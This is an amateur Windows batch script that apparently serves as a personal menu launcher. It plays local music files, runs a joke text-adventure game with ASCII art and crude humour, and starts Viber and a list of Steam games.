if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9k







































:musicplayer2
echo.
echo please insert the number of the song you want
echo back-(back)
echo exit-(exit)
echo tales from the borderlands-kiss the sky     (1)
echo tales from the borderlands-my silver lining (2)
echo ed sheeran-castle on the hill               (3)
echo ed sheeran-shape of you                     (4)
echo sia-move your body                          (5)
echo david guetta ft. sia-beautiful people say   (6)
echo david guetta-would i lie to you             (7)
echo carnage ft. timmy trumpet-toca bass boosted (8)
echo rocket league-seeing whats next             (9)
echo rocket league-we speak chinese              (10)
echo rocket league-solar eclipse                 (11)
echo the last of us 2-through the valley         (12)
echo alessia cara-scars to your beautiful        (13)
echo rag'n'bone man-human                        (14)
echo arian grande-side to side                   (15)
echo daft punk-get lucky                         (16)
echo david guetta-light my body up               (17)
echo imagine dragons-levitate                    (18)
echo imagine dragons-beliver                     (19)
echo lp-lost on you swanky tunes remix           (20)
echo martin garrix-bouncy bob                    (21)
echo martin garrix-in the name of love           (22)
echo martin garrix-scared to be lonely           (23)
echo lord-green light                            (24)
set /p mc=ENTER:
if %mc%== 1 goto m1
if %mc%== 2 goto m2
if %mc%== 3 goto m3
if %mc%== 4 goto m4
if %mc%== 5 goto m5
if %mc%== 6 goto m6
if %mc%== 7 goto m7
if %mc%== 8 goto m8
if %mc%== 9 goto m9
if %mc%== 10 goto m10
if %mc%== 11 goto m11
if %mc%== 12 goto m12
if %mc%== 13 goto m13
if %mc%== 14 goto m14
if %mc%== exit goto exit
if %mc%== back goto hl9k

:m1
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 
if %chs200%== 2 start www.mp3juices.cc 
start C:\Users\"fico pico"\Music\music\"Tales from the borderlands episode 2 intro song-Shawn Lee's Ping Pong Orchestra feat. Nino Mochella - Kiss The Sky.mp3"
pause
goto musicplayer2
:m2
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start C:\Users\"fico pico"\Music\music\"Tales From The Borderlands Episode 5 End Credits Song (My Silver Lining).mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m3
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start C:\Users\"fico pico"\Music\music\"Ed Sheeran - Castle On The Hill Official Lyric Video (1).mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m4
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start C:\Users\"fico pico"\Music\music\"Ed Sheeran - Shape Of You Official Lyric Video.mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m5
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start C:\Users\"fico pico"\Music\music\"Sia - Move Your Body (Alan Walker Remix) Audio.mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m6
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start C:\Users\"fico pico"\Music\music\"David Guetta - Beautiful People Say ft. Sia Lyrics (1).mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m7
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start C:\Users\"fico pico"\Music\music\"David Guetta_ Cedric Gervais & Chris Willis - Would I Lie To You (Lyric Video) (1).mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m8
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start C:\Users\"fico pico"\Music\music\"Carnage feat. Timmy Trumpet & KSHMR - Toca Bass Boosted (1).mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m9
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start C:\Users\"fico pico"\Music\music\"Seeing What's Next.mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m11
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start C:\Users\"fico pico"\Music\music\"Rocket League Music Solar eclipse.mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m10
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start C:\Users\"fico pico"\Music\music\"We speak Chinese-Rocket League OST.mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m12
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start C:\Users\"fico pico"\Music\music\"The Last Of Us Part II-Ashley Johnson (Ellie) - Through The Valley Extended Version.mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m13
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start C:\Users\"fico pico"\Music\music\"Alessia Cara - Scars To Your Beautiful (Audio).mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m14
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start C:\Users\"fico pico"\Music\music\"Rag'n'Bone Man - Human (Rudimental Remix) Official Video.mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m15
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start "Ariana Grande ft. Nicki Minaj - Side To Side (Lyrics).mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m16
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start "Daft Punk - Get Lucky (Official Audio) ft. Pharrell Williams, Nile Rodgers.mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m17
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start "David Guetta feat Nicki Minaj & Lil Wayne - Light My Body Up (Lyric Video).mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m18
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start "Imagine Dragons - Levitate (Audio).mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m19
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start "Imagine Dragons - Believer (Audio).mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m20
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start "LP - Lost On You (Swanky Tunes & Going Deeper Remix).mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m21
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start "Martin Garrix - Bouncybob (Feat. Justin Mylo & Mesto) FREE DOWNLOAD.mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m22
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start "Martin Garrix & Bebe Rexha - In The Name Of Love (Official Audio).mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m23
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start "Martin Garrix & Dua Lipa - Scared To Be Lonely (Lyric Video).mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2
:m24
echo.
echo play song     (1)
echo download song (2)
set /p chs200=ENTER:
if %chs200%== 1 start "Lorde - Green Light.mp3"
if %chs200%== 2 start www.mp3juices.cc 
pause
goto musicplayer2

:menu
echo.
cls 
echo Loading.. 
ping localhost -n 2 >nul 
cls 
echo Loading... 
ping localhost -n 2 >nul 
cls 
echo Connected 
pause
echo welcome to The Advanture
echo begin (1)
echo exit  (2)
set /p menu=ENTER:
if %menu%== 1 goto home
if %menu%== 2 goto exit

:home
cls
echo loading..
ping localhost -n 2 >nul
cls
echo loading...
ping localhost -n 2 >nul
echo complete
cls
pause
echo.
echo -------------------------------------------------
echo       !W    E    L    C    O    M    E!
echo -------------------------------------------------
echo start     (1)
echo exit      (2)
echo settings  (3)
set /p chose=
if %chose%== 1 goto begin
if %chose%== 2 goto exit
if %chose%== 3 goto colors

:exit
exit

:colors
echo ----------------------------------------------------
echo        S    E    T    T    I    N    G    S
echo ----------------------------------------------------
echo please type in the color of your choosing
set /p clr=BLUE,RED,YELLOW,GREEN,PURPLE:
if %clr%== blue goto beginB
if %clr%== red goto beginR
if %clr%== yellow goto beginY
if %clr%== green goto beginG
if %clr%== purple goto beginP

:begin
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginB
color 03
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginR
color 04
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginG
color 02
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginY
color 06
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginP
color 05
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto prologue
if %chs%== 3 goto exit

:tutorial
echo the controls for this game are simple
echo when asked where to go type in the direction you want to go in
echo you can choose any direction but you cant go back
echo example:forward\left\right
echo as for fighting you use the numbers on your keyboard
echo example:attack1--key "1"
echo when your ready continue
echo continue (1)
echo exit     (2)
set /p chs2=
if %chs2%== 1 goto prolouge
if %chs2%== 2 goto exit

:prolouge
echo.
echo Narator:Hello,i am the narator
echo Narator:I will be guiding you through this "amaechoing" advanture
echo Narator:whell if it was amaechoing than it would have been text based 
echo Narator:never mind,you have been put in a scenario where you save the...world..
echo Narator:really...really!
echo Narator:Thats the best this fuck could do,i mean come on,again,a end of the world scenarion
echo Narator:Im out of here!
echo Narator:NARATOR Out!
echo type in start to whell...start
set /p chs3=
if %chs3%== start goto encounter
goto prologue
 
:encounter
 
                                 `                  
echo                             .+yhs:                
echo                          .+yhhhhhhh+-             
echo                       `/yhhhhhhhhhhhhy/`          
echo                    `/shhhhhhhhhhhhhhhhhhs:`       
echo                  :sddhhhhhhhhhhhhhhhhhhhhhh+-     
echo               -ohdoohdddhhhhhhhhhhhhhhhhhhhhhy/`  
echo            `/yds:.--.:sdddhhhhhhhhhhhhhhhhhhddd:  
echo          :sdy/` +soos/ `/ydddhhhhhhhhhhhhddddo:   
echo       .ohho.    /soos:    .+hddhhhhhhhddddy/:     
echo    `/yds:`       `..`        :sdddhhdddyooo:+.    
echo   `dyo` --:-:-.        .-:-:-- `oymdho///oyhhhy/  
echo    . :  /:+:+-:        :-+:/:/  : o++/+:-yhhhhhh- 
echo    :o+  oo::+/:        /++:/++  : ++yyhsohhhhhhho 
echo    ohho ./:+//:/        /://+:+` -`+hhhhhhhhhhhhho 
echo   :hhho `......`        .......  - yhhhhhhdhhhhhh+ 
echo   +hhho        :---::---:        -`hhhhhhhhhhhhhh- 
echo   +hhh+        +::://:::+        :`hhhhhhhhhhhhhy  
echo   /hhh+        +::://:::+        : yhhhhhhdhhhhh/  
echo   -hhh+        +::+o+/::+        : ohhhhhh/.-:-.   
echo    yhh+        +::://:::+        :.+hhhhhy`        
echo    :+oo------.-+::://:::+-----...+--/+o++-         
echo      .........----------........-   


echo          what a wonderfull day...
echo          lets go to work.
set /p drc=direction:
if %drc%==forwad goto work
if %drc%==left goto work
if %drc%==right goto work 

:work
echo.
echo loading..
ping localhost -n 2 >nul
cls
echo loading...
ping localhost -n 2>nul
cls
pause
echo ....`                                                     
echo              .+-/.--://--                                                 
echo              /..-::::::.+.                                                
echo              `+::-.``..-+                                                 
echo               +   ....+.                                                  
echo               +       .:                                                  
echo               +        +                                                  
echo              `/        o                                                  
echo              :.        o                                                  
echo              +         o`                                                 
echo              +         :-                                                 
echo              +         ./ ...-.`                                     .    
echo             `/          o-/-/-.o       .-:`   .::`  `-:/`  `::    .::-:`  
echo -.          s:- :  +-------`  -/::.  :/:-   :/:-  ::::`   `+: 
echo      `/+:-.-.+`         o .---++/:    -/+`   -/+`  `/+-    ::/`   -:-// / 
echo     :: -:-.--+:--.-----:.   ./.  .+`-/.  :-`/.  /-::  ./`::   /--:.+:`  / 
echo .+`o-.....--------......./....../:-----:/--:::/:::::://:::/:o-:-.    / 
echo    o  ++-------.....+    .------`   `o---------..............:-/``      + 
echo +``++.```````````s:://:---   .-. `+.......................--: `.... :- 
echo    o  +----------:/:`        -:`  `:.+-----------------------:.:---..-:o  
echo    o  +         /:             ::   /`    `+/:` :/:-`          :`//---``: 
echo    o``+       `+`               `/   +   `/`//`-/`o:`      ..` :`+:+/// + 
echo    o `+       +      `---..`     `+  -/``+ /...+`-:.-----.+:.s.:`/::/o:-- 
echo   `+.`+      +`    ::.  : `-:.    .:/....o -/::s``o---------:` : .+-:---  
echo /--   +      o   `+`    -    ::    /`-+:.o `/` :. +            : :-       
echo :-     +      o   +   --`-`--  +`   /  `: :. /  -- +            -/.        
echo ./     +     `+  `/   .- - -.  -:   /  .+-// o::/+.o------------:`         
echo .-----:::::::o..//....../---..:o---o//.   .-`    `                        
echo              ```````````````````````
echo. 
echo You:whell that was a nother day of work i guess...
echo You:bye everyone.
pause
goto apocolipse

:apocolipse
echo              .:syhhy:       
echo              ohysyooh+       
echo              `y+/+-+s`       
echo               .:/+::-        
echo :/+/:-`        `:s/-+//-`      
echo./smmmds     :/y/o//y+:/.     
echo   +sms/+..-:+:+---oo++-:-    
echo    :s//y:::++/o---os -o+/    
echo              ::--:hy/ .+/`   
echo              /ysoysy+  `::-. 
echo              odddddh   :/+s+ 
echo             :hhdhhhho    ..  
echo            .hhddsdhhh:       
echo            yhhdy .hhhd-      
echo           `hhdh+  .hhhd+     
echo            shddh+  .dhhd+    
echo            .hhhdh-  /dhhdy   
echo             :dddd:   yddds   
echo           :mmmNmd    oNNNy   
echo           -oo++-     smmdd-

echo     GIVE ME YOUR MONEY!
echo give money (1)
echo fight      (2)
set /p thg=ENTER:
if %thg%== 1 goto pussy1
if %thg%== 2 goto fight1

:pussy1
echo You:ok,ok...here you go,just dont hurt me...pls...
set /p drc1=DIRECTION:
if %drc1%==forward goto home1
if %drc1%==left goto home1
if %drc1%==right goto home1

:home1
echo.
echo whell that was a bad decision
echo i guess you cant go on the advanture now
echo bye you fuck
pause
goto exit

:fight1
cls
echo attack    (1)
echo pussy out (2)
set /p atc=ENTER:
if %atc%== 1 goto attack1
if %atc%== 2 goto pussy1
goto fight1

:attack1
cls
echo. 
echo Narator:You punched him in the balls as he screamed and ran away
echo Narator:you proudly went home with your money
echo.
echo Oh hey,im back btw.
echo explenation (1)
echo continue    (2)
set /p chs4=
if %chs4%== 1 goto explenation1
if %chs4%== 2 goto home1

:explenation1
echo.
echo Narator:whell you see...
echo Narator:i wasnt really allowed to go away
echo Narator:i kind of signed a contract
echo Narator:so i had to stay
echo Narator:never mind me,lets continue with the story
set /p chs5=Continue (Y/N):
if %chs5%== Y goto obduction
if %chs5%== N goto exit
goto explenation1

:obduction 
pause
echo.
echo                                                             
echo                                                                           
echo                                                                           
echo                               ```        `` `                             
echo                              `.```.`  `....::````                         
echo                         `         `---:.```````````                       
echo                       ``        ``//--/o-```````````                      
echo                      ``  ````````:sooo/so````````````                     
echo                 ```.`````....-++::sssssso-+o+.......``.``                 
echo           ``..--:://-..`````.+oosssssssssss/o:`````...////::-.`           
echo       `.----:://++++-```..-:++./yssssssssss..+/:-..``.++++++++//:-`       
echo   `.-:----//++++++++/-...--::--/sssssssssss------...-/+++++++++++++/:.`   
echo `-:-..-///:://++++++++/:--------+++++o++++/-------:/++++++++++////++++/:. 
echo./++//++++/:-::/+++++++++++//////////////////////++++++++++++/::--/+++oo+/.
echo  .:osyysoo+++++++++++++++++++++++/////+++++++++++++++++++++++++oosyys+:.  
echo     `-/oyyhyyysooo++++++++++++++/-.-::/+++++++++++++++++ossyhhhhy+:.`     
echo         `.:+syyhhhyyyyssooo+++++++++++++++++++ooosssyyyhhhhyo/-`          
echo              `.-/+osyhhhhhhhhyyyyyyyyyyyyyyyhhhhhhhhho+/-.`               
echo                    -yhhhhhhhhhhhhhhhhhhhhhhhhdddddd+                     
echo                     `/syhhhhhhhhhhhhhhhhhhddddddhs-                      
echo                        `-/oyyyhhhhhhhhhhhhhddhyo:.                        
echo                             .-::/+++++++//:-.`       
echo.           
echo Alians:Hello
echo Alians:we are the intergalactic police force
echo Alians:we would like you to join us
echo Alians:we have seen your amaechoing balls punching
echo Alians:we have seen great potential 
echo Alians:we will take you
pause
goto obduction2

:obduction2
echo             `:/ooo`                                                       
echo          `+ydddmNmd:                                                      
echo          dNNNMMMMMNms`                                                    
echo          hMMMMMMMMMNmhosso+/.                                             
echo          oMMMMMMMMMMMdNmMMmhd/                                            
echo        `:yMMMMMMMMNhys+hmMmdh.                                            
echo      `omMMmNNNNNmdh/syhmmmd+`                                             
echo      dMMMMmddddddmmmmmmNNNmdho-```````                                    
echo      +dmNMMMMMMMMMNNmmmmmmmmmmmddddddddhs/`                               
echo       `..:dNNNNNmmmmmmmmNNNNNNNNNNNNNNNNNm+                               
echo         .hmmmmmmmNNNNNmmdddddddmNNNNNNNNdo`                               
echo      .:odmmNNNNNmddhhyhhhhyyyyssNNNNNdy/.                                 
echo   ./ydmNNNNNmdhyhhhhhhyyyyyyyyhdmmhs:.                                    
echo `odmNNNNNNNmoyyyyyyyysyyyyhhhhys++-                                       
echo oNNNNNNNNNNmhhhhyhhhhhhyyso++//////:`                                     
echo .ohddddddddddhyyysoo++//////////////:-`                                   
echo    ``......``` .://///////////////////:.                                  
echo                 .://////////////////////:.                                
echo                  `:///////////////////////-`                              
echo                   `:///////////////////////:-`                            
echo                    `:////////////////////////:.                           
echo                     `://///////////////////////:`                         
echo                      -//////////////////////////-`                       
echo                        -//////////////////////////:.                      
echo `   `  `   `  `   `      -///////////////////////////:.                    
echo ::++os+ssooysshhyhhhys+odhdddddddddddddhhmddmdhmmdddhdhsyysso++++++++//:::.
echo.
echo human has been acquired!
echo ALIANS Out!
pause
goto spaceship

:spaceship
echo.
echo Comander:welcome human
echo Comander:we are Banakafalatans
echo Comander:we have TAKEN you
echo Billy:omfg its like that movie we saw last night
echo Comander:Billy shut it
echo Comander:The subject isnt apropriate
echo Comander:Nevermind Billy please
echo Comander:You will be taken for examination
echo Comander:afterwords if the producers have enough money
echo Comander:Will put you on a space advanture
pause
goto spaceadvanture

:spaceadvanture
echo Comander:you will be traned as the best
echo Comander:you will be seen as one of ours
echo Comander:there will be no compremises
echo Trainer:come with me
echo I will be training you
echo first you need to choose a weapon
echo Standard Blaster (1)/(4-preview)
echo Laser Sword      (2)/(4-preview)
echo Advanced Blaster (3)/(4-preview)
set /p chs6=
if %chs6%== 1 goto stb
if %chs6%== 2 goto lsw
if %chs6%== 3 goto adb
if %chs6%== 4 goto preview1

:lsw
echo Trainer:great choice
echo Trainer:now for our training
echo lets start off with learning how to use your weapon
echo press (1) to go to training center
set /p chs12=
if %chs12%== 1 goto trc2
goto stb

:stb
echo Trainer:great choice
echo Trainer:now for our training
echo lets start off with learning how to use your weapon
echo press (1) to go to training center
set /p chs12=
if %chs12%== 1 goto trc
goto stb

:adw
echo Trainer:great choice
echo Trainer:now for our training
echo lets start off with learning how to use your weapon
echo press (1) to go to training center
set /p chs12=
if %chs12%== 1 goto trc3
goto adw

:trc3
echo Trainer:welcome to the training center
echo Trainer:we have found a target for you to train on
echo Trainer:this is one of the best training dummies
echo Dummy health:100
echo standard attack (1)
echo advanced attack (2)
set /p atck20=Enter:
if %atck20%== 1 goto atc20
if %atck20%== 2 goto atc21
goto trc

:atc20 
echo Dummy health:100-65
echo standard attack (1)
echo advanced attack (2)
set /p atck21=Enter:
if %atck21%== 1 goto atc23
if %atck21%== 2 goto atc25

:atc21
echo Dummy health:100-65+10(ice ammo)
echo standard attack (1)
echo advanced attack (2)
set /p atck22=Enter:
if %atck22%== 1 goto atc26
if %atck22%== 2 goto atc27

:atc26
echo Dummy health:25-65
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt23=(Y/N):
if %cnt23%= Y goto spaceadvanture2
if %cnt23%= N goto exit
goto atc22 

:atc27
echo Dummy health:25-65+10(ice ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt24=(Y/N):
if %cnt24%= Y goto spaceadvanture2
if %cnt24%= N goto exit
goto atc12

:atc23
echo Dummy health:35-65
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt25=(Y/N):
if %cnt25%= Y goto spaceadvanture2
if %cnt25%= N goto exit
goto atc22 

:atc25
echo Dummy health:35-65+10(ice ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt26=(Y/N):
if %cnt26%= Y goto spaceadvanture2
if %cnt26%= N goto exit
goto atc12

:trc2
echo Trainer:welcome to the training center
echo Trainer:we have found a target for you to train on
echo Trainer:this is one of the best training dummies
echo Dummy health:100
echo standard attack (1)
echo advanced attack (2)
set /p atck2=Enter:
if %atck2%== 1 goto atc3
if %atck2%== 2 goto atc4
goto trc

:atc3 
echo Dummy health:100-40
echo standard attack (1)
echo advanced attack (2)
set /p atck3=Enter:
if %atck3%== 1 goto atc13
if %atck3%== 2 goto atc23

:atc4
echo Dummy health:100-40+10(fire ball)
echo standard attack (1)
echo advanced attack (2)
set /p atck=Enter:
if %atck4%== 1 goto atc14
if %atck4%== 2 goto atc24

:atc24
echo Dummy health:60-40+10(fire ball)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt8=(Y/N):
if %cnt8%= Y goto spaceadvanture2
if %cnt8%= N goto exit
goto atc22 

:atc14
echo Dummy health:50-40
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt9=(Y/N):
if %cnt9%= Y goto spaceadvanture2
if %cnt9%= N goto exit
goto atc12

:atc23
echo Dummy health:50-40
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt10=(Y/N):
if %cnt10%= Y goto spaceadvanture2
if %cnt10%= N goto exit
goto atc22 

:atc13
echo Dummy health:60-40
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt11=(Y/N):
if %cnt11%= Y goto spaceadvanture2
if %cnt11%= N goto exit
goto atc12

:trc
echo Trainer:welcome to the training center
echo Trainer:we have found a target for you to train on
echo Trainer:this is one of the best training dummies
echo Dummy health:100
echo standard attack (1)
echo advanced attack (2)
set /p atck=Enter:
if %atck%== 1 goto atc1
if %atck%== 2 goto atc2
goto trc

:atc1 
echo Dummy health:100-45
echo standard attack (1)
echo advanced attack (2)
set /p atck12=Enter:
if %atck12%== 1 goto atc12
if %atck12%== 2 goto atc22

:atc2
echo Dummy health:100-45+10(fire ammo)
echo standard attack (1)
echo advanced attack (2)
set /p atck13=Enter:
if %atck13%== 1 goto atc15
if %atck13%== 2 goto atc25

:atc25
echo Dummy health:55-45+10(fire ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt14=(Y/N):
if %cnt14%= Y goto spaceadvanture2
if %cnt14%= N goto exit
goto atc22 

:atc15
echo Dummy health:45-45
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt15=(Y/N):
if %cnt15%= Y goto spaceadvanture2
if %cnt15%= N goto exit
goto atc12

:atc22
echo Dummy health:55-45+10(fire ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt16=(Y/N):
if %cnt16%= Y goto spaceadvanture2
if %cnt16%= N goto exit
goto atc22 

:atc12
echo Dummy health:55-45
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt17=(Y/N):
if %cnt17%= Y goto spaceadvanture2
if %cnt17%= N goto exit
goto atc12

:preview1
echo (1)-standar blaster
echo (2)-laser sword
echo (3)-advanced blaster
set /p chs7=Enter:
if %chs7%== 1 goto preview2
if %chs7%== 2 goto preview3
if %chs7%== 3 goto preview4

:preview3
cls
echo          D  M  G:40
echo          S P E T I A L:fire ball 
echo.
echo                                   
echo                                                  ````````                 
echo                                              ```...----..`                
echo                                            `..----------.`                
echo                                         ``..------------.`                
echo                                       ``..-----....-----.`                
echo                                     ``..-----..``.-----.``                
echo                                   ``..--:---.``..-----.``                 
echo                                  `..-:::--.``..------.``                  
echo                                ``.-::::-.```..-----..`                    
echo                              ``.--:::-..``..--:---.``                     
echo                             `..-:::--.``..--:::-..`                       
echo                           ``.-::::-.```.--:::--.``                        
echo                          `.--:::-.```..-::::-.``                          
echo                        ``.--::--.```.--:::--.`                            
echo                       `..-::--.```.--:::--.``                             
echo                     ``.-----.```..-::::-.``                               
echo                    .:..---.```..--:::-..`                                 
echo                    `+o:-:.```.--:::--.`                                   
echo                     `-oo///-------..``                                    
echo                     `.+/+yo-.....``                                       
echo                    `::/o::-+o/.`                                          
echo                   .:/+/`    ```                                           
echo                  -/+-                                                     
echo               `:oo-                                                       
echo               `//-  
pause
goto spaceadvanture                                                      
                                                           
:preview2
cls
echo          D  M  G:45
echo          S P E T I A L:fire ammo
echo.
echo                                                                   
echo                   .-:`  ```                                               
echo       ```````.--:/yyyyosyyyo.````                                         
echo      /yyyyssyhhhhhhyyyhhddhs.```        ``                                
echo      -yyhhysssdmdosyyyoohhs``..--:://+osyo/``````........-------.....     
echo      `////.``.yhhhhhhhhhhyyyyyyyyyyyyhhddyyysys------..........------`    
echo        .sysyyyhhhhhhhhdddddhhhhhyoo+++syyyyyyyy:----::::::::::--.``       
echo    -oosshhhddddhhhhhhyyyyyyyyyyo//++++shhhyyyss/:---...`````              
echo    oyyhyyhyyyyhhhhhhhhhhhddddddyyy+--....``                               
echo    sdddddmdmdyssoyhydddhyhhyyy+/-/.                                       
echo    `ohyooo+/:    `yhdddyhhsoy-   `-                                       
echo     ```          `hdmdmhy-.-+. `..                                        
echo                 .yyyhdh:`   `.``                                          
echo                `hyyyyh-                                                   
echo               `hhyyyh-                                                    
echo               odyyyd-                                                     
echo               `+yhdd-                                                     
echo                  `..     
pause
goto spaceadvanture

:preview4                                                 
cls
echo          D  M  G:65    
echo          S P E T I A L:ice ammo
echo.
echo                       `::--..--..-+.`                                  
echo                        ``-ysydyyssyyyydo..```````                         
echo   ```     `://:///::/:oyyhoossdhdhyyhhmddddddhhhs/.``````..`              
echo  .yssssoo+yddyssyyyyyhmyhdyyhhdhdhhhyyhhyyyyyosyyhhyss++//++/-......`.``  
echo  :mhmmmmmmhh/://s///smmhhyhhyddddddhhhhhhyyysosysyysssoooso+y+++////-//:  
echo  +mhdmddddso/-::/--://++s+ssodmdyyhssysyyyyyssysddmmmmmmmdy-.```````````  
echo  sdyyhho:.`                `oyhhs-:``sssssooo/:-:--------:.               
echo `hhhhy:`                  `oyyyo.`.``-```````                             
echo  ....`                    +yhy+`                                          
echo                          `.:/`                                           
pause
goto spaceadvanture                                                                                                       

:spaceadvanture2
echo work in progres....
echo thank you for playing the closed alpha preview 
pause
exit

:viber1
start C:\Users\"fico pico"\AppData\Local\Viber\Viber.exe 
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:steam1
echo.
echo choose an option
echo start steam                               (1)
echo start Fallout New Vegas                   (2)
echo start Terraria                            (3)
echo start Castle Crashers                     (4)
echo start The Elder Scrolls V:Skyrim          (5) 
echo start Saints Row IV                       (6)
echo start Just Cause 2                        (7)
echo start Victor Vran                         (8)
echo start Left 4 Dead 2                       (9)
echo start Lego MARVEL Super Heroes            (10)
echo start Garry's Mod                         (11)
echo start Goat Simulator                      (12)
echo start A Story About My Uncle              (13)
echo start Scrap Mechanic                      (14)
echo start Borderlands:The Pre Sequel          (15)
echo start Hotline Miami                       (16)
echo start Dirt 3:Complete Edition             (17)
echo start Trine 2                             (18)
echo start One Finger Death Punch              (19)
echo start Castlevania:Lords of Shadow         (20)
echo start Far Cry 3                           (21)
echo start Super Meat Boy                      (22)
echo start Metal Gear Solid V:The Phantom Pain (23)
echo start The Witcher 3:Wild Hunt             (24)
echo start Euro Truck Simulator                (25)
echo start Battlefield 4                       (26)
echo start Crysis 3                            (27)
echo start Metro Last Ligh Redux               (28)
echo start Guacamelee Super Turbo Championship (29)
echo start Scribblenauts Unmasked              (30)
echo start Shadow Warrior 2                    (31)
echo start The Vanishing of Ethan Carter       (32)
